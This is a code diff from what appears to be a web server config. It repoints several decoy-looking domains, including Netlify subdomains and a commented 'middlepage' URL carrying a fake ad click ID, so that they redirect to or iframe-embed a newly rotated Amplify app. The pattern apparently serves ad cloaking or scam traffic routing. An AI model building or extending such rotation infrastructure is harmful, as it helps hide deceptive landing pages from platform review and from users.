@@ -85,18 +85,18 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://cute-hotteok-51402d.netlify.app": { method: "redirect", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
-    "https://teruogames.org": { method: "redirect", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
+    "https://cute-hotteok-51402d.netlify.app": { method: "redirect", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
+    "https://teruogames.org": { method: "redirect", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.dfao144u8ixzi.amplifyapp.com" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d1z19dbhjalic7.amplifyapp.com" },
   },
 };
 
@@ -675,7 +675,7 @@ app.get("/fetchPrank", (req, res) => {
 function isAuthorized(req) {
   // Replace with whatever "who is requesting" check you want.
   // Simple Netlify-origin allowlist:
-  const allowed = ["https://main.dfao144u8ixzi.amplifyapp.com"];
+  const allowed = ["https://main.d1z19dbhjalic7.amplifyapp.com"];
   return allowed.includes(req.get("origin"));
 }
 
